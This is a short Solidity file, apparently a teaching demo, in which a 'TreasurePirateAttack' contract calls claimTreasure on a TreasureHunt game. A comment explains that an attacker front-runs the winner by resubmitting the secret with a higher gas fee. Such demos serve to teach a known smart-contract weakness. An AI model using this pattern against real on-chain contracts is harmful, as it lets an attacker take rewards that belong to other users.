// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITreasureHunt {
    function claimTreasure(string calldata _secret) external;
}

/*
PirateAttack shows how an attacker can front-run the TreasureHunt game by submitting the winning transaction with a higher gas fee.
*/

contract TreasurePirateAttack {
    ITreasureHunt public game;

    constructor(address _game) {
        game = ITreasureHunt(_game);
    }

    function attack(string memory _secret) public {
        game.claimTreasure(_secret);
    }
}
